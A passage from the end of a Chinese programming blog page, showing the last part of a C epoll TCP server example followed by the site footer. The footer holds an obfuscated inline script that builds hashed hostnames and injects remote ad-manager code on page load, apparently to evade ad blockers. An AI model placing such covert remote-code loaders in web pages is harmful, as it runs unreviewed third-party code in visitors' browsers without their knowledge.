background-color:inherit">"read"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          done = 1;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                        }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">break</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">else</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> </span><span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (count == 0)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* End of file. The remote has closed the</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                         connection. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      done = 1;  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">break</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">;  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Write the buffer to standard output */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  s = write (1, buf, count);  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (s == -1)  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    {  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      perror (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"write"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">);  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                      abort ();  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">              <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">if</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> (done)  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                {  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  printf (<span class="string" style="margin:0px; padding:0px; border:currentColor; background-color:inherit">"Closed connection on descriptor %d\n"</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">,  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                          events[i].data.fd);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  <span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">/* Closing the descriptor will make epoll remove it</span> </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit"><span class="comment" style="margin:0px; padding:0px; border:currentColor; color:rgb(0,130,0); background-color:inherit">                     from the set of descriptors which are monitored. */</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit">  </span></span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                  close (events[i].data.fd);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">                }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">            }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">        }  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">    }  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  free (events);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  close (sfd);  </span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  </span> </li><li class="alt" style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:inherit; line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">  <span class="keyword" style="margin:0px; padding:0px; border:currentColor; color:blue; background-color:inherit">return</span><span style="margin:0px; padding:0px; border:currentColor; background-color:inherit"> EXIT_SUCCESS;  </span></span> </li><li style="border-style:none none none solid; list-style:decimal-leading-zero; margin:0px!important; padding:0px 3px 0px 10px!important; color:rgb(85,85,85); line-height:18px; border-left-color:rgb(153,153,153); border-left-width:3px; background-color:rgb(245,250,226)"> <span style="margin:0px; padding:0px; border:currentColor; color:black; background-color:inherit">}  </span> </li></ol> 
</div>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2cd0d06a01dff1fd3fb7af334062196c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Java中的逃逸分析和TLAB以及Java对象分配</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7c395ca67fb4e7cf871219eccf9e0cd3/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">bug修复日记------玩家第一次登陆的信息没有存储</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>